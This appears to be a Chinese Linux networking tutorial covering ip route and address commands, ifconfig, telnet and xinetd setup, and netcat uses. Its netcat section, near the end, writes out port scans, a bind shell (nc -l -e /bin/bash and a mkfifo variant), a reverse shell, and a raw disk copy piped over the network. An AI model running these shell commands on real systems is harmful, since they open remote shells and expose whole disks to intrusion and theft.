ip route show table local       #查看本地静态路由
ip route show table main        #查看直连路由

#添加静态路由
ip route add 10.0.0.0/24 via 192.168.92.129
ip route add 10.10.10.10 via 192.168.92.129

ip route add 172.31.100.0/24 dev eno16777736
ip route add 172.32.0.2 dev eno16777736

#查看路由表
[root@localhost ~]# ip route show table main
#删除
ip route del 10.0.0.0/24
ip route del 10.10.10.10

ip route del 172.31.100.0/24
ip route del 172.32.0.2
#再次查看路由表
[root@localhost ~]# ip route show table main
[root@localhost ~]# ip route show table local
#添加网卡别名
ip addr add 192.168.0.11/24 dev eno16777736

#查看下网卡,别名没有产生,而是直接继承
[root@localhost ~]# ip addr show eno16777736

#添加网卡别名并添加标记    label
ip addr add 192.168.1.2 label eno16777736:0 dev eno16777736

#查看下,多了eno16777736:0
ip addr show eno16777736

[root@localhost ~]# ip addr add 192.168.55.191/24 label eth0:1 dev eth0
[root@localhost ~]# ip addr show

</pre>

<h4>ifconfig命令 interfaces config</h4><pre>
ifconfig命令被用于配置和显示Linux内核中网络接口(网卡)的网络参数与网络状态等信息
用ifconfig命令配置的网卡信息,在网卡重启后机器重启后,配置就不存在。要想将配置信息永远的存的电脑里就要修改网卡的配置文件

Linux系统中网卡命名规律:
eth0为第一块以太网卡(Ethernet Card),eth1为第二块。lo为环回接口,它的IP地址固定为127.0.0.1,掩码8位

格式为"ifconfig [网络设备] [参数]"

参数:
up   启动指定网络设备/网卡。
down 关闭指定网络设备/网卡。可有效地阻止经指定接口的IP信息流,要永久关闭一个接口还需从核心路由表中将该接口路由信息全删除
arp       设置指定网卡是否支持ARP协议。
-promisc  设置是否支持网卡的promiscuous模式,如果选择此参数网卡将接收网络中发给它所有的数据包
-allmulti 设置是否支持多播模式,如果选择此参数,网卡将接收网络中所有的多播数据包
-a        显示全部接口信息
-s        显示摘要信息(类似于netstat -i)
add       给指定网卡配置IPv6地址
del       删除指定网卡的IPv6地址
<硬件地址>        配置网卡最大的传输单元
mtu<字节数>       设置网卡的最大传输单元(bytes)
netmask<子网掩码> 设置网卡的子网掩码。掩码可以是有前缀0x的32位十六进制数,也可以是用点分开的4个十进制数。如果不打算将网络分成子网,可以不管这一选项;如果要使用子网,那么请记住,网络中每一个系统必须有相同子网掩码
tunel               建立隧道
dstaddr             设定一个远端地址,建立点对点通信
-broadcast<地址>    为指定网卡设置广播协议
-pointtopoint<地址> 为网卡设置点对点通讯协议
multicast           为网卡设置组播标志
address             为网卡设置IPv4地址
txqueuelen<长度>    为网卡设置传输列队的长度

网卡的常用命令
ifconfig             # 显示当前激活的网络接口信息
ifconfig -a          # 查看所有网卡网络接口,无论是否激活
ifconfig eth0        # 查看指定网络接口eth0的信息
ifconfig eth85 down  # 关闭终止网卡eth85,ssh登陆linux服务器操作要小心,关闭了就不能开启了,除非有多网卡
ifdown eth85
ifconfig eth85 up    # 启动激活网卡eth85,对DHCP自动分配的IP得由各个发行版自带的网络工具来激活,然得安装dhcp客户端
ifup eth85

配置ip地址,为指定网络接口设置IP地址和掩码,并自动激活。比如:eth0, eth0:0, eth0:1,后两个为虚拟网卡
格式:ifconfig {INTERFACE} {IP}
格式:ifconfig {INTERFACE} {IP} netmask {NETMASK}

ifconfig eth0 192.168.2.10
ifconfig eth0 192.168.2.10 netmask 255.255.255.0
ifconfig eth0 192.168.2.10 netmask 255.255.255.0 broadcast 192.168.2.255

ifconfig eth0 hw ether 00:AA:BB:CC:dd:EE       # 用ifconfig修改MAC地址,hw后接网络接口类型,ether乙太网,也支持ax25 、ARCnet、netrom等

ifconfig eth0 192.168.1.99 broadcast 192.168.1.255 netmask 255.255.255.0 up
等同于
ifconfig eth0 down
ifconfig eth0 192.168.1.99 broadcast 192.168.1.255 netmask 255.255.255.0
ifconfig eth0 up

ifconfig eth1 192.168.1.252 hw ether 04:64:03:00:12:51 netmask 255.255.255.0 broadcast 192.168.1.255 up
等同于
ifconfig eth1 hw ether 04:64:03:00:12:51
ifconfig eth1 192.168.1.252 netmask 255.255.255.0 broadcast 192.168.1.255 up

为指定网络接口添加IP地址
格式:ifconfig {INTERFACE} add {IP}
格式:ifconfig {INTERFACE}:0 {IP}

为指定网络接口删除IP地址
格式:ifconfig {INTERFACE} del {IP}

ifconfig eth0 add 33ffe:3240:800:1005::2/64    # 为网卡eth0配置IPv6地址
ifconfig eth0 del 33ffe:3240:800:1005::2/64    # 为网卡eth0删除IPv6地址
ifconfig eth0 arp                              # 开启网卡eth0 的arp协议
ifconfig eth0 -arp                             # 关闭网卡eth0 的arp协议
ifconfig eth0 mtu 1500                         # 设置能通过的最大数据包大小为 1500 bytes

#删除eth85网口上,IP地址为156.41.50.12、子网掩码为255.255.255.0的IP
ip addr del 156.41.50.12/24 dev eth85

ifconfig eth1:0 10.175.102.123 netmask 255.255.252.0 up  # 配置浮动ip

将Linux主机接入到网络需要配置网络相关设置
一般包括如下内容:
      主机名
      IP/netmask
      路由:默认网关
      DNS服务器
             主DNS服务器
             次DNS服务器
             第三DNS服务器

#防止重启失效
在/etc/sysconfig/network目录下,vi ifcfg-【网卡名称】【Mac地址】
例:ifcfg-eth1 ifcfg-E0:24:7F:B6:FD:1B
在文件中加入IP信息,并保存文件
BOOTPROTO='static'
STARTMODE='auto'
IPADDR='182.3.1.180'
NETMASK='255.255.0.0'
重启网卡让IP生效 rcnetwork restart eth5

#样例
BOOTPROTO='static'
BROADCAST=''
IPADDR='192.121.1.71'
NETMASK='255.255.255.0'
STARTMODE='auto'
USERCONTROL='no'
FIREWALL='no'
DEVICE=eth1

</pre><textarea>[root@localhost ~]# ifconfig
eth0      Link encap:Ethernet  HWaddr 00:16:3E:00:1E:51
          inet addr:10.160.7.81  Bcast:10.160.15.255  Mask:255.255.240.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:61430830 errors:0 dropped:0 overruns:0 frame:0
          TX packets:88534 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:3607197869(3.3 GiB)  TX bytes:6115042(5.8 MiB)

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:56103 errors:0 dropped:0 overruns:0 frame:0
          TX packets:56103 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:5079451(4.8 MiB)  TX bytes:5079451(4.8 MiB)

eth0       网络接口,网卡名称, 以太网:eth[0,1,2,...],ppp:ppp[0,1,2,...],eth0表示第一块网卡,
link encap 网络类型,Ethernet(以太网)
HWaddr     网卡物理地址,硬件mac地址
Inet addr  IP地址
Bcast      广播地址
Mask       子网掩码
UP(代表网卡开启状态)RUNNING(代表网卡的网线被接上)MULTICAST(支持组播)MTU:1500(最大传输单元):1500字节
RX packets,TX packets 接收和传输的数据包个数
RX byte,TX byte      接收、发送数据字节数统计信息
Interrupt             终端信息
Base address          内存地址

lo是表示主机的回环地址,一般是用来测试一个网络程序,但又不想让局域网或外网的用户能够查看,只能在此台主机上运行和查看所用的网络接口。比如把httpd服务器的指定到回环地址,在浏览器输入127.0.0.1就能看到WEB网站了,局域网的其它主机或用户无从知道

docker0   Link encap:Ethernet  HWaddr 02:50:f2:bd:31:03
          inet addr:169.254.26.30  Bcast:169.254.255.255  Mask:255.255.0.0
          inet6 addr: fe80::51ed:3d51:c0df:7a5f/64 Scope:Global
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0
          RX bytes:0(0.0 B)  TX bytes:0(0.0 B)

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Global
          UP LOOPBACK RUNNING  MTU:1500  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0
          RX bytes:0(0.0 B)  TX bytes:0(0.0 B)

vethd765199 Link encap:Ethernet  HWaddr 02:50:f2:bd:31:03
          inet addr:169.254.140.171  Bcast:169.254.255.255  Mask:255.255.0.0
          inet6 addr: fe80::dd08:e0a9:e8e3:8cab/64 Scope:Global
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0
          RX bytes:0(0.0 B)  TX bytes:0(0.0 B)

wifi0     Link encap:UNSPEC  HWaddr 74-DF-BF-39-85-FF-00-00-00-00-00-00-00-00-00-00
          inet addr:192.168.43.27  Bcast:192.168.43.255  Mask:255.255.255.0
          inet6 addr: 240e:c0:f012:d079:85db:9e4e:248d:5f84/64 Scope:Global
          inet6 addr: 240e:c0:f012:d079:e1b8:8ec9:f571:6561/128 Scope:Global
          inet6 addr: fe80::85db:9e4e:248d:5f84/64 Scope:Global
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0
          RX bytes:0(0.0 B)  TX bytes:0(0.0 B)

</textarea><pre>
【 用ifconfig来配置虚拟网络接口 】
有时为了满足不同的需要还需要配置虚拟网络接口,比如用不同的IP地址来架运行多个HTTPD服务器就要用到虚拟地址;这样就省却了同一个IP地址,如果开设两个的HTTPD服务器时要指定端口号。

虚拟网络接口指的是为一个网络接口指定多个IP地址,虚拟接口是这样的eth0:0、eth0:1、eth0:2 ... eth1N。为eth1指定多个IP地址,也就是eth1:0、eth1:1、eth1:2 ... 以此类推;

指定时要为每个虚拟网卡指定不同的物理地址

其实用ifconfig为一个网卡配置多个IP地址,就用ifconfig的用法,这个比较简单;看下面的例子;
[root@linuxchao ~]#ifconfig eth1:0 192.168.1.251 hw ether 04:64:03:00:12:51 netmask 255.255.255.0 broadcast 192.168.1.255 up
或
[root@linuxchao ~]#ifconfig eth1 hw ether 04:64:03:00:12:51
[root@linuxchao ~]#ifconfig eth1 192.168.1.251 netmask 255.255.255.0 broadcast 192.168.1.255 up

【 系统中网络接口配置文件样本,采用DHCP方式,并增加虚拟网卡 】
# cat /etc/sysconfig/network-scripts/ifcfg-eth0
DEVICE=eth0
ONBOOT=yes
BOOTPROTO=dhcp

# cat /etc/sysconfig/network-scripts/ifcfg-eth0:0
DEVICE=eth0:0
ONBOOT=yes
#BOOTPROTO=dhcp
BOOTPROTO=static
IPADDR=192.168.227.227
NETMASK=255.255.255.0
ONBOOT=yes

# service network restart
正在关闭接口 eth0:                                        [  确定  ]
关闭环回接口:                                             [  确定  ]
设置网络参数:                                             [  确定  ]
弹出环回接口:                                             [  确定  ]
弹出界面 eth0:                                            [  确定  ]

# ifconfig -a
eth0      Link encap:Ethernet  HWaddr 00:0C:29:E3:D2:65
          inet addr:192.168.227.128  Bcast:192.168.227.255  Mask:255.255.255.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:389 errors:0 dropped:0 overruns:0 frame:0
          TX packets:341 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:40273(39.3 Kb)  TX bytes:37785(36.8 Kb)
          Interrupt:10 Base address:0x2000

eth0:0    Link encap:Ethernet  HWaddr 00:0C:29:E3:D2:65
          inet addr:192.168.227.227  Bcast:192.168.227.255  Mask:255.255.255.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:389 errors:0 dropped:0 overruns:0 frame:0
          TX packets:341 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:40273(39.3 Kb)  TX bytes:37785(36.8 Kb)
          Interrupt:10 Base address:0x2000

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:355 errors:0 dropped:0 overruns:0 frame:0
          TX packets:355 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:25703(25.1 Kb)  TX bytes:25703(25.1 Kb)
#

【系统中网络接口配置文件样本,固定IP地址】
# cat /etc/sysconfig/network-scripts/ifcfg-eth0
# Broadcom Corporation NetXtreme II BCM5706 Gigabit Ethernet
DEVICE=eth0
BOOTPROTO=static
BROADCAST=211.103.28.31
HWADDR=00:1B:78:40:8C:20
IPADDR=211.103.28.xx
IPV6INIT=yes
IPV6_AUTOCONF=yes
NETMASK=255.255.255.224
NETWORK=211.103.28.0
ONBOOT=yes

# cat /etc/sysconfig/network-scripts/ifcfg-eth1
# Broadcom Corporation NetXtreme II BCM5706 Gigabit Ethernet
DEVICE=eth1
BOOTPROTO=static
BROADCAST=192.168.1.255
HWADDR=00:1B:78:40:8C:22
IPADDR=192.168.1.191
NETMASK=255.255.255.0
NETWORK=192.168.1.0
ONBOOT=yes
[root@jfht ~]#

</pre>

<h4>telnet命令</h4><pre>
Telnet协议是TCP/IP协议族中的一员,是Internet远程登陆服务的标准协议和主要方式。它为用户提供了在本地计算机上完成远程主机工作的能力。在终端使用者的电脑上使用telnet程序,用它连接到服务器。终端使用者可以在telnet程序中输入命令,这些命令会在服务器上运行,就像直接在服务器的控制台上输入一样,可以在本地就能控制服务器。要开始一个telnet会话,必须输入用户名和密码来登录服务器。Telnet是常用的远程控制Web服务器的方法

Ubuntu安装后默认只有telnet客户端,即只能在Ubuntu内去连接其他telnet服务器
安装telnetd服务端:sudo apt install telnetd

Telnet服务虽然也属于客户机/服务器模型的服务,但它更大的意义在于实现了基于Telnet协议的远程登录(远程交互式计算)

远程登录是指用户使用Telnet命令,使自己的计算机暂时成为远程主机的一个仿真终端的过程。仿真终端等效于一个非智能的机器,它只负责把用户输入的每个字符传递给主机,再将主机输出的每个信息回显在屏幕上

工作过程
使用Telnet协议进行远程登录时需要满足以下条件:在本地计算机上必须装有包含Telnet协议的客户程序;必须知道远程主机的Ip地址或域名;必须知道登录标识与口令。
Telnet远程登录服务分为以下4个过程:
1)本地与远程主机建立连接。该过程实际上是建立一个TCP连接,用户必须知道远程主机的Ip地址或域名;
2)将本地终端上输入的用户名和口令及以后输入的任何命令或字符以NVT(Net Virtual Terminal)格式传送到远程主机。该过程实际上是从本地主机向远程主机发送一个IP数据包;
3)将远程主机输出的NVT格式的数据转化为本地所接受的格式送回本地终端,包括输入命令回显和命令执行结果;
4)最后本地终端对远程主机进行撤消连接,该过程是撤销一个TCP连接。

但telnet因为采用明文传送报文,安全性不好,很多Linux服务器都不开放telnet服务,而改用更安全的ssh方式了。但仍然有很多别的系统可能采用了telnet方式来提供远程登录,因此弄清楚telnet客户端的使用方式仍是很有必要的

telnet命令还可做别的用途,比如确定远程服务的状态,比如确定远程服务器的某个端口是否能访问

但对于入侵者而言,Telnet只是一种远程登录的工具。一旦入侵者与远程主机建立了Telnet连接,入侵者便可以使用目标主机上的软、硬件资源,而入侵者的本地机只相当于一个只有键盘和显示器的终端而已

telnet用于远程登录到网络中的计算机,并以命令行的方式远程管理计算机,远程机器必须启动telnet服务器,否则无法打开telnet命令

例如:在命令提示符中输入"telnet 114.80.67.193",按回车键,但为了安全起见,要输入"n"并按回车键,出现登录提示符。输入登录名后,按回车键即可登录到远程机器。

使用telnet的open子命令远程登录远程机器。命令格式:open hostname[port],hostname为ip地址,port默认为23。 在telnet提示符下输入"open 114.80.67.193",按回车键。再输入"n",根据提示输入用户名和密码即可远程机器上。

使用telnet的unset子命令关闭本地回显功能。操作过程:先在命令提示符中输入"telnet",按回车键;然后输入"setlocalecho",按回车键,即可打开本地回显功能;如要关闭回显能力,只要在telnet命令提示符后输入"unsetlocalecho",按回车。

使用telnet的status子命令查看连接状态。操作过程: 输入"telnet"进入telnet命令,再输入"status",按回车,此时显示当前已经登录到IP为114.80.67.193的机器上。

Telnet客户端命常用命令:
open : 使用open hostname可以建立到主机的Telnet连接。如打开cmd输入telnet,输入open www.00aq.com 80
close : 使用close命令可以关闭现有的Telnet连接。
display : 使用display命令可以查看Telnet客户端的当前设置。
send : 使用send命令可以向Telnet服务器发送命令。支持以下命令:
  ao : 放弃输出命令
  ayt : "Are you there"命令。
  esc : 发送当前的转义字符。
  ip : 中断进程命令。
  synch : 执行Telnet同步操作。
  brk : 发送信号。
上表所列命令以外的其他命令都将以字符串的形式发送至Telnet服务器,例如send abcd将发送字符串abcd至Telnet服务器,这样Telnet会话窗口中将出现该字符串。

quit :使用quit命令可以退出Telnet客户端。

1．命令格式:
telnet[参数][主机]

2．命令功能:
执行telnet指令开启终端机阶段作业,并登入远端主机。

3．命令参数:
-8 允许使用8位字符资料,包括输入与输出。
-a 尝试自动登入远端系统。
-b<主机别名> 使用别名指定远端主机名称。
-c 不读取用户专属目录里的.telnetrc文件。
-d 启动排错模式。
-e<脱离字符> 设置脱离字符。
-E 滤除脱离字符。
-f 此参数的效果和指定"-F"参数相同。
-F 使用Kerberos V5认证时加上此参数可把本地主机的认证数据上传到远端主机。
-k<域名> 使用Kerberos认证时加上此参数让远端主机采用指定的领域名,而非该主机的域名。
-K 不自动登入远端主机。
-l<用户名称> 指定要登入远端主机的用户名称。
-L 允许输出8位字符资料。
-n<记录文件> 指定文件记录相关信息。
-r 使用类似rlogin指令的用户界面。
-S<服务类型> 设置telnet连线所需的IP TOS信息。
-x 假设主机有支持数据加密的功能,就使用它。
-X<认证形态> 关闭指定的认证形态。

4．使用实例:
实例1:远程服务器无法访问

[root@localhost ~]# telnet 192.168.120.209
Trying 192.168.120.209...
telnet: connect to address 192.168.120.209: No route to host
telnet: Unable to connect to remote host: No route to host

说明:
处理这种情况方法:
(1)确认ip地址是否正确？
(2)确认ip地址对应的主机是否已经开机？
(3)如果主机已经启动,确认路由设置是否设置正确？(使用route命令查看)
(4)如果主机已经启动,确认主机上是否开启了telnet服务？(使用netstat命令查看,TCP的23端口是否有LISTEN状态的行)
(5)如果主机已经启动telnet服务,确认防火墙是否放开了23端口的访问？(使用iptables-save查看)

实例2:域名无法解析
[root@localhost ~]# telnet www.baidu.com
www.baidu.com/telnet: Temporary failure in name resolution

说明:
处理这种情况方法:
(1)确认域名是否正确
(2)确认本机的域名解析有关的设置是否正确(/etc/resolv.conf中nameserver的设置是否正确,如果没有,可以使用nameserver 8.8.8.8)
(3)确认防火墙是否放开了UDP53端口的访问(DNS使用UDP协议,端口53,使用iptables-save查看)

实例3:
[root@localhost ~]# telnet 192.168.120.206
Trying 192.168.120.206...
telnet: connect to address 192.168.120.206: Connection refused
telnet: Unable to connect to remote host: Connection refused

处理这种情况:
(1)确认ip地址或者主机名是否正确？
(2)确认端口是否正确,是否默认的23端口

实例4:启动telnet服务
service xinetd restart

[root@localhost ~]# cd /etc/xinetd.d/
[root@localhost xinetd.d]# ll
总计 124
-rw-r--r-- 1 root root 1157 2011-05-31 chargen-dgram
-rw-r--r-- 1 root root 1159 2011-05-31 chargen-stream
-rw-r--r-- 1 root root  523 2009-09-04 cvs
-rw-r--r-- 1 root root 1157 2011-05-31 daytime-dgram
-rw-r--r-- 1 root root 1159 2011-05-31 daytime-stream
-rw-r--r-- 1 root root 1157 2011-05-31 discard-dgram
-rw-r--r-- 1 root root 1159 2011-05-31 discard-stream
-rw-r--r-- 1 root root 1148 2011-05-31 echo-dgram
-rw-r--r-- 1 root root 1150 2011-05-31 echo-stream
-rw-r--r-- 1 root root  323 2004-09-09 eklogin
-rw-r--r-- 1 root root  347 2005-09-06 ekrb5-telnet
-rw-r--r-- 1 root root  326 2004-09-09 gssftp
-rw-r--r-- 1 root root  310 2004-09-09 klogin
-rw-r--r-- 1 root root  323 2004-09-09 krb5-telnet
-rw-r--r-- 1 root root  308 2004-09-09 kshell
-rw-r--r-- 1 root root  317 2004-09-09 rsync
-rw-r--r-- 1 root root 1212 2011-05-31 tcpmux-server
-rw-r--r-- 1 root root 1149 2011-05-31 time-dgram
-rw-r--r-- 1 root root 1150 2011-05-31 time-stream
[root@localhost xinetd.d]# cat krb5-telnet
# default: off
# description: The kerberized telnet server accepts normal telnet sessions, \
#              but can also use Kerberos 5 authentication.
service telnet
{
        flags           = REUSE
        socket_type     = stream
        wait            = no
        user            = root
        server          = /usr/kerberos/sbin/telnetd
        log_on_failure  += USERID
        disable         = yes
}
[root@localhost xinetd.d]#


配置参数,通常的配置如下:
service telnet
{
disable = no #启用
flags = REUSE #socket可重用
socket_type = stream #连接方式为TCP
wait = no #为每个请求启动一个进程
user = root #启动服务的用户为root
server = /usr/sbin/in.telnetd #要激活的进程
log_on_failure += USERID #登录失败时记录登录用户名
}

如果要配置允许登录的客户端列表,加入
only_from = 192.168.0.2 #只允许192.168.0.2登录
如果要配置禁止登录的客户端列表,加入
no_access = 192.168.0.{2,3,4} #禁止192.168.0.2、192.168.0.3、192.168.0.4登录

如果要设置开放时段,加入
access_times = 9:00-12:00 13:00-17:00 # 每天只有这两个时段开放服务(我们的上班时间:P)

如果你有两个IP地址,一个是私网的IP地址如192.168.0.2,一个是公网的IP地址如218.75.74.83,如果你希望用户只能从私网来登录telnet服务,那么加入
bind = 192.168.0.2

各配置项具体的含义和语法可参考xined配置文件属性说明(man xinetd.conf)

配置端口,修改services文件:
# vi /etc/services
找到以下两句
telnet 23/tcp
telnet 23/udp

如果前面有#字符,就去掉它。telnet的默认端口是23,这个端口也是黑客端口扫描的主要对象,因此最好将这个端口修改掉,修改的方法很简单,就是将23这个数字修改掉,改成大一点的数字,比如61123。注意,1024以下的端口号是internet保留的端口号,因此最好不要用,还应该注意不要与其它服务的端口冲突。

启动服务:
service xinetd restart

实例5:正常telnet
[root@andy ~]# telnet 192.168.120.204
Trying 192.168.120.204...
Connected to 192.168.120.204(192.168.120.204).
Escape character is '^]'.

    localhost(Linux release 2.6.18-274.18.1.el5 #1 SMP Thu Feb 9 12:45:44 EST 2012)(1)

login: root
Password:
Login incorrect

说明:
一般情况下不允许root从远程登录,可以先用普通账号登录,然后再用su -切到root用户。

</pre>

<h4>netcat命令 nc命令</h4><pre>
netcat是网络工具中的瑞士军刀,能通过TCP和UDP在网络中读写数据。通过与其他工具结合和重定向,可以在脚本中以多种方式使用它。使用netcat命令所能完成的事情令人惊讶。
netcat所做的就是在两台电脑之间建立链接并返回两个数据流,在这之后所能做的事很多,能建立一个服务器,传输文件,与朋友聊天,传输流媒体或者用它作为其它协议的独立客户端

usage: nc [-46CDdFhklNnrStUuvZz] [-I length] [-i interval] [-M ttl]
          [-m minttl] [-O length] [-P proxy_username] [-p source_port]
          [-q seconds] [-s source] [-T keyword] [-V rtable] [-W recvlimit] [-w timeout]
          [-X proxy_protocol] [-x proxy_address[:port]]           [destination] [port]
        Command Summary:
                -4              Use IPv4
                -6              Use IPv6
                -b              Allow broadcast
                -C              Send CRLF as line-ending
                -D              Enable the debug socket option
                -d              Detach from stdin
                -F              Pass socket fd
                -h              This help text
                -I length       TCP receive buffer length
                -i interval     Delay interval for lines sent, ports scanned
                -k              Keep inbound sockets open for multiple connects
                -l              Listen mode, for inbound connects
                -M ttl          Outgoing TTL / Hop Limit
                -m minttl       Minimum incoming TTL / Hop Limit
                -N              Shutdown the network socket after EOF on stdin
                -n              Suppress name/port resolutions
                -O length       TCP send buffer length
                -P proxyuser    Username for proxy authentication
                -p port         Specify local port for remote connects
                -q secs         quit after EOF on stdin and delay of secs
                -r              Randomize remote ports
                -S              Enable the TCP MD5 signature option
                -s source       Local source address
                -T keyword      TOS value
                -t              Answer TELNET negotiation
                -U              Use UNIX domain socket
                -u              UDP mode
                -V rtable       Specify alternate routing table
                -v              Verbose
                -W recvlimit    Terminate after receiving a number of packets
                -w timeout      Timeout for connects and final net reads
                -X proto        Proxy protocol: "4", "5"(SOCKS) or "connect"
                -x addr[:port]  Specify proxy address and port
                -Z              DCCP mode
                -z              Zero-I/O mode [used for scanning]
        Port numbers can be individual or ranges: lo-hi [inclusive]

1,端口扫描
如果未安装nmap,试试nc/netcat命令。

-z : 端口扫描模式即零 I/O 模式。
-v : 显示详细信息 [使用 -vv 来输出更详细的信息]。
-n : 使用纯数字 IP 地址,即不用 DNS 来解析 IP 地址。
-w 1 : 设置超时值设置为1。

-z参数用来告诉nc报告开放的端口,而不是启动连接。在nc命令中使用-z参数时,需要在主机名/ip后面限定端口的范围和加速其运行

nc -z -v {host-name-here} {port-range-here}
nc -z -v host-name-here ssh
nc -z -v host-name-here 22
nc -w 1 -z -v server-name-here port-Number-her

// 扫描 1 to 1023
nc -zv vip-1.vsnl.nixcraft.in 1-1023
// 扫描单个端口
nc -zv v.txvip1 443
nc -zv v.txvip1 80
nc -zv v.txvip1 22
nc -zv v.txvip1 21
nc -zv v.txvip1 smtp
nc -zvn v.txvip1 ftp
// 使用1秒的超时值来更快的扫描
netcat -v -z -n -w 1 v.txvip1 1-1023

2.Chat Server
假如想和朋友聊聊,有很多的软件和信息服务可以使用。但是如果没有这么奢侈的配置,比如在计算机实验室,所有的对外的连接都是被限制的,怎样和整天坐在隔壁房间的朋友沟通？netcat提供了这样一种方法,只需要创建一个Chat服务器,一个预先确定好的端口,这样子就可以联系到你了。

// Server
$nc -l 1567
netcat命令在1567端口启动了一个tcp服务器,所有的标准输出和输入会输出到该端口。输出和输入都在此shell中展示。

// Client
$nc 172.31.100.7 1567
不管在机器B上键入什么回车之后都会出现在机器A上。

3,文件传输
假设两个服务器的IP分别是[A(172.31.100.7) B(172.31.100.23)]
通过网络或其他工具传输文件有很多种方法,比如FTP,SCP,SMB等等,但是只是需要临时或一次传输文件,不值得浪费时间来安装配置一个软件到机器上。假设想要传一个文件file.txt从A到B。A或B都可以作为服务器或者客户端,以下,让A作为服务器,B为客户端

// server
$nc -l 1567 < file.txt

// client
$nc -n 172.31.100.7 1567 > file.txt

创建了一个服务器在A上并且重定向netcat的输入为文件file.txt,那么当任何成功连接到该端口,netcat会发送file的文件内容。
在客户端我们重定向输出到file.txt,当B连接到A,A发送文件内容,B保存文件内容到file.txt.
没有必要创建文件源作为Server,我们也可以相反的方法使用。像下面的我们发送文件从B到A,但是服务器创建在A上,这次我们仅需要重定向netcat的输出并且重定向B的输入文件。
B作为Server

// Server
$nc -l 1567 > file.txt

// Client
nc 172.31.100.23 1567 < file.txt

4,目录传输
发送一个文件很简单,但是如果想要发送多个文件或整个目录,只需要使用压缩工具tar,压缩后发送压缩包。

通过网络传输一个目录从A到B
// Server
$tar -cvf – dir_name | nc -l 1567

// Client
$nc -n 172.31.100.7 1567 | tar -xvf -

这里在A服务器上创建一个tar归档包并且通过-在控制台重定向它,然后使用管道,重定向给netcat,netcat可以通过网络发送它。
在客户端下载该压缩包通过netcat 管道然后打开文件。
如果想要节省带宽传输压缩包,可以使用bzip2或者其他工具压缩。

// Server
$tar -cvf – dir_name| bzip2 -z | nc -l 1567
通过bzip2压缩

// Client
$nc -n 172.31.100.7 1567 | bzip2 -d |tar -xvf -
使用bzip2解压

5. 加密通过网络发送的数据
如果担心在网络上发送数据的安全,可以在发送数据之前用如mcrypt的工具加密,使用其它任意加密工具都可以

// 服务端使用mcrypt工具加密数据
$nc localhost 1567 | mcrypt –flush –bare -F -q -d -m ecb > file.txt

// 客户端使用mcrypt工具解密数据
$mcrypt –flush –bare -F -q -m ecb < file.txt | nc -l 1567

以上两个命令会提示需要密码,确保两端使用相同的密码。

6. 流视频
虽然不是生成流视频的最好方法,但如果服务器上没有特定的工具,使用netcat仍然有希望做成这件事。

// 服务端,从一个视频文件中读入并重定向输出到netcat客户端
$cat video.avi | nc -l 1567

// 从socket中读入数据并重定向到mplayer
$nc 172.31.100.7 1567 | mplayer -vo x11 -cache 3000 -

7,克隆一个设备
如果已经安装配置一台Linux机器并且需要重复同样的操作对其他的机器,而不想在重复配置一遍。不在需要重复配置安装的过程,只启动另一台机器的一些引导可以随身碟和克隆你的机器。
克隆Linux PC很简单,假如系统在磁盘/dev/sda上

// Server
$dd if=/dev/sda | nc -l 1567

// Client
$nc -n 172.31.100.7 1567 | dd of=/dev/sda

dd是一个从磁盘读取原始数据的工具,我通过netcat服务器重定向它的输出流到其他机器并且写入到磁盘中,它会随着分区表拷贝所有的信息。但是如果我们已经做过分区并且只需要克隆root分区,我们可以根据我们系统root分区的位置,更改sda 为sda1,sda2.等等。

8,打开一个shell
过远程shell-使用telnet和ssh,但是如果这两个命令没有安装并且没有权限安装,也可以使用netcat创建远程shell

假设netcat支持 -c -e 参数(默认 netcat)

// Server
$nc -l 1567 -e /bin/bash -i

// Client
$nc 172.31.100.7 1567

这里已经创建了一个netcat服务器并且表示当它连接成功时执行/bin/bash
假如netcat 不支持-c 或者 -e 参数(openbsd netcat),仍然能够创建远程shell

// Server
$mkfifo /tmp/tmp_fifo
$cat /tmp/tmp_fifo | /bin/sh -i 2>&1 | nc -l 1567 > /tmp/tmp_fifo

这里创建了一个fifo文件,然后使用管道命令把这个fifo文件内容定向到shell 2>&1中。是用来重定向标准错误输出和标准输出,然后管道到netcat运行的端口1567上。至此已经把netcat的输出重定向到fifo文件中。

从网络收到的输入写到fifo文件中
cat 命令读取fifo文件并且其内容发送给sh命令
sh命令进程受到输入并把它写回到netcat。
netcat 通过网络发送输出到client
至于为什么会成功是因为管道使命令平行执行,fifo文件用来替代正常文件,因为fifo使读取等待而如果是一个普通文件,cat命令会尽快结束并开始读取空文件。

// Client在客户端仅仅简单连接到服务器,会得到一个shell提示符在客户端
$nc -n 172.31.100.7 1567

9.反向shell
反向shell是指在客户端打开的shell。反向shell这样命名是因为不同于其他配置,这里服务器使用的是由客户提供的服务。

// 服务端
$nc -l 1567

// 在客户端,简单地告诉netcat在连接完成后,执行shell。
$nc 172.31.100.7 1567 -e /bin/bash

